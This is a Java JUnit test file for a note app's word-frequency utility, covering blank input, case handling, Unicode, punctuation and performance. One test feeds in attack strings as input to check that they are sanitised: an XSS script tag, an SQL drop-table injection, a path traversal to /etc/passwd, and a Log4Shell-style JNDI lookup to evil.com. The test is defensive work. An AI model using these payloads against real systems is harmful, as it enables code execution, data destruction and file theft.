package dev.jjerome.qoq.test.app.application.service;

import dev.jjerome.qoq.test.app.application.utils.NoteStatisticsUtils;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("NoteStatisticsService Unit Tests")
class NoteStatisticsUtilTest {

    @Nested
    @DisplayName("calculateWordFrequencies() tests")
    class CalculateWordFrequenciesTests {

        @Test
        @DisplayName("Should return empty map for null or blank text")
        void shouldReturnEmptyMapForBlankText() {
            String text = null;
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result).isEmpty();
        }

        @ParameterizedTest
        @NullAndEmptySource
        @ValueSource(strings = {"  ", "\t", "\n"})
        @DisplayName("Should return empty map for blank strings")
        void shouldReturnEmptyMapForVariousBlankStrings(String text) {
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result).isEmpty();
        }

        @Test
        @DisplayName("Should count word frequencies correctly")
        void shouldCountWordFrequenciesCorrectly() {
            String text = "Hello world Hello Java world world";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result)
                    .hasSize(3)
                    .containsEntry("world", 3)
                    .containsEntry("hello", 2)
                    .containsEntry("java", 1);
        }

        @Test
        @DisplayName("Should sort by frequency descending, then alphabetically")
        void shouldSortCorrectly() {
            String text = "apple banana apple cherry banana apple";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result.keySet())
                    .containsExactly("apple", "banana", "cherry");
        }

        @Test
        @DisplayName("Should handle case insensitivity")
        void shouldHandleCaseInsensitivity() {
            String text = "Java JAVA java";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result)
                    .hasSize(1)
                    .containsEntry("java", 3);
        }

        @Test
        @DisplayName("Should handle Unicode characters")
        void shouldHandleUnicodeCharacters() {
            String text = "Привіт Світ Привіт Україна Світ Світ";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result)
                    .hasSize(3)
                    .containsEntry("світ", 3)
                    .containsEntry("привіт", 2)
                    .containsEntry("україна", 1);
        }

        @Test
        @DisplayName("Should ignore punctuation and special characters")
        void shouldIgnorePunctuation() {
            String text = "Hello, world! Hello... world?";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result)
                    .hasSize(2)
                    .containsEntry("hello", 2)
                    .containsEntry("world", 2);
        }

        @Test
        @DisplayName("Should handle numbers in words")
        void shouldHandleNumbersInWords() {
            String text = "Java8 Java11 Java8 Java17";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result)
                    .hasSize(3)
                    .containsEntry("java8", 2)
                    .containsEntry("java11", 1)
                    .containsEntry("java17", 1);
        }

        @Test
        @DisplayName("Should handle very long text efficiently - Performance test")
        void shouldHandleLongTextEfficiently() {
            String word = "test ";
            String text = word.repeat(10000);
            long startTime = System.currentTimeMillis();
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            long duration = System.currentTimeMillis() - startTime;
            assertThat(result)
                    .hasSize(1)
                    .containsEntry("test", 10000);
            assertThat(duration).isLessThan(1000);
        }

        @Test
        @DisplayName("Security: Should handle malicious input with excessive special characters")
        void shouldHandleMaliciousInput() {
            String text = "<script>alert('XSS')</script>" +
                    "'; DROP TABLE notes; --" +
                    "../../etc/passwd" +
                    "${jndi:ldap://evil.com/a}";
            Map<String, Integer> result = NoteStatisticsUtils.calculateWordFrequencies(text);
            assertThat(result)
                    .doesNotContainKey("<script>")
                    .doesNotContainKey("DROP")
                    .allSatisfy((key, value) -> assertThat(key).matches("[\\p{L}\\p{Nd}]+"));
        }
    }
}